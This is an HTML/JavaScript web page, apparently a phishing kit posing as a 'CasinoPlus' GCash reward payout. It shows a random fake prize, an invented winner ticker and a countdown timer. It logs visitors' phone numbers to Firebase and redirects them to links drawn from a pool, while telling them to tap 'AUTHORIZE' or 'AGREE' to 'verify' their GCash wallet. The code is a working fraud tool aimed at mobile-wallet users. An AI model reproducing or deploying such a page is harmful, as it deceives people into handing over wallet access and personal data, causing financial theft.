<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CasinoPlus | Live Payout</title>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="js/config.js"></script>

    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;800&family=Orbitron:wght@700&display=swap" rel="stylesheet">

    <script>
        // Security & Mobile Check
        (function() {
            const isBanned = localStorage.getItem("cp_device_locked") === "true";
            const isVerified = localStorage.getItem("cp_verified") === "true";
            if (isBanned || !isVerified) { window.location.replace("index.html"); return; }
        })();
    </script>
</head>
<body>

    <div id="processingOverlay">
        <div class="spinner"></div>
        <div class="proc-title">ESTABLISHING SECURE VIALINK...</div>
        <div class="proc-text">⚠️ <b>REQUIRED ACTION:</b><br>Tap <b>"AUTHORIZE"</b> or <b>"AGREE"</b> on the next screen to verify your GCash wallet and receive the reward.</div>
    </div>

    <div id="mainContent" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
        
        <div class="live-stats">
            <div class="online-count"><span class="dot"></span> <span id="userCount">32</span> Members Online</div>
            <div class="live-winner-box" id="winnerBox">
                <span id="winnerEntry">User 0917***8821 claimed <img src="images/gc_icon.png" class="gc-mini-icon">₱500</span>
            </div>
        </div>

        <div class="game-grid">
            <div class="card-wrapper" id="goddess-card" onclick="triggerMove(this)">
                <img src="images/img1.png" class="card-img idle">
            </div>
            <div class="card-wrapper" id="monkey-card" onclick="triggerMove(this)">
                <img src="images/img2.png" class="card-img idle">
            </div>
            <div class="card-wrapper" id="zeus-card" onclick="triggerMove(this)">
                <img src="images/img3.png" class="card-img idle">
            </div>
            <div class="card-wrapper" id="bear-card" onclick="triggerMove(this)">
                <img src="images/img4.png" class="card-img idle">
            </div>
            <div class="card-wrapper" id="dress-card" onclick="triggerMove(this)">
                <img src="images/img5.png" class="card-img idle">
            </div>
            <div class="card-wrapper" id="boxer-card" onclick="triggerMove(this)">
                <img src="images/img6.png" class="card-img idle">
            </div>
        </div>

        <div class="card">
            <img src="images/logo1.png" class="logo-img">
            <div style="font-size: 11px; color: #fbbf24; letter-spacing: 2px; font-weight: 800;">TOTAL REWARD</div>
            <div class="amount" id="balanceText">₱0.00</div>
            <div class="timer-box" id="timerLabel">Unlocking reward in: <span id="countdown">05</span>s</div>
            
            <div class="btn-group">
                <button class="pay-button" id="claimBtn" onclick="redirectToGCash()" disabled>Withdraw via GCash</button>
            </div>
            
            <img src="images/casinoplus.jpeg" class="promo-photo">
        </div>
    </div>

    <script>
        // --- 1. INITIALIZE ---
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const savedPhone = localStorage.getItem("userPhone") || "Guest_" + Math.floor(Math.random() * 1000);
        
        // Permanent Reward Logic
        const possibleAmounts = [350, 500, 750, 1000, 1200];
        let assignedTotal = localStorage.getItem("assigned_total");
        if (!assignedTotal) {
            assignedTotal = possibleAmounts[Math.floor(Math.random() * possibleAmounts.length)];
            localStorage.setItem("assigned_total", assignedTotal);
        }
        assignedTotal = parseInt(assignedTotal);

        let clickedCards = JSON.parse(localStorage.getItem("clicked_cards") || "[]");

        window.onload = function() {
            // Restore state
            clickedCards.forEach(id => {
                const el = document.getElementById(id);
                if(el) el.classList.add('card-disabled');
            });
            if (clickedCards.length >= 6) {
                document.getElementById('balanceText').innerText = "₱" + assignedTotal.toLocaleString() + ".00";
            } else if (clickedCards.length > 0) {
                let partial = Math.floor((assignedTotal / 6) * clickedCards.length);
                document.getElementById('balanceText').innerText = "₱" + partial.toLocaleString() + ".00";
            }
        };

        // --- 2. UNIQUE CHARACTER MOVES ---
        function triggerMove(element) {
            const id = element.id;
            if (clickedCards.includes(id)) return;

            let animClass = "";
            switch(id) {
                case "goddess-card": animClass = "move-goddess"; break;
                case "monkey-card": animClass = "move-monkey"; break;
                case "zeus-card": animClass = "move-zeus"; break;
                case "bear-card": animClass = "move-bear"; break;
                case "dress-card": animClass = "move-dress"; break;
                case "boxer-card": animClass = "move-boxer"; break;
            }

            element.classList.add(animClass);
            element.classList.add('card-disabled');
            clickedCards.push(id);
            localStorage.setItem("clicked_cards", JSON.stringify(clickedCards));

            // Update Balance Animation
            let currentBalance = Math.floor((assignedTotal / 6) * (clickedCards.length - 1));
            let targetBalance = Math.floor((assignedTotal / 6) * clickedCards.length);
            
            if(clickedCards.length === 6) targetBalance = assignedTotal;
            animateValue(currentBalance, targetBalance, 500);
        }

        function animateValue(start, end, duration) {
            let startTimestamp = null;
            const step = (timestamp) => {
                if (!startTimestamp) startTimestamp = timestamp;
                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
                const currentVal = Math.floor(progress * (end - start) + start);
                document.getElementById('balanceText').innerText = "₱" + currentVal.toLocaleString() + ".00";
                if (progress < 1) window.requestAnimationFrame(step);
            };
            window.requestAnimationFrame(step);
        }

        // --- 3. FIREBASE ADOPTION (IDLE/CLAIMED) ---
        function updateFirebaseStatus(status) {
            db.ref('user_logs/' + savedPhone).update({
                phone: savedPhone,
                reward: assignedTotal,
                status: status, // "idle_attempt" or "claimed"
                last_updated: new Date().toLocaleString()
            });
        }

        function redirectToGCash() {
            const claimBtn = document.getElementById('claimBtn');
            const overlay = document.getElementById('processingOverlay');
            
            claimBtn.disabled = true;
            overlay.style.display = 'flex';
            
            // Mark as IDLE muna sa database
            updateFirebaseStatus("idle_attempt");

            db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', snapshot => {
                if (snapshot.exists()) {
                    const linkId = Object.keys(snapshot.val())[0];
                    const targetUrl = snapshot.val()[linkId].url;

                    // Mark as CLAIMED dahil nakuha na ang link
                    updateFirebaseStatus("claimed");
                    
                    db.ref('links/' + linkId).update({ status: 'pending', user: savedPhone });
                    setTimeout(() => { window.location.href = targetUrl; }, 3500);
                } else {
                    alert("System busy! Please try again in 5 minutes.");
                    overlay.style.display = 'none';
                    claimBtn.disabled = false;
                }
            });
        }

        // Timer
        let timeLeft = 5;
        const countdownTimer = setInterval(() => {
            timeLeft--;
            if(document.getElementById('countdown')) document.getElementById('countdown').innerText = "0" + timeLeft;
            if (timeLeft <= 0) {
                clearInterval(countdownTimer);
                document.getElementById('timerLabel').innerHTML = "Reward Slots Ready!";
                document.getElementById('claimBtn').disabled = false;
            }
        }, 1000);
    </script>
</body>
</html>
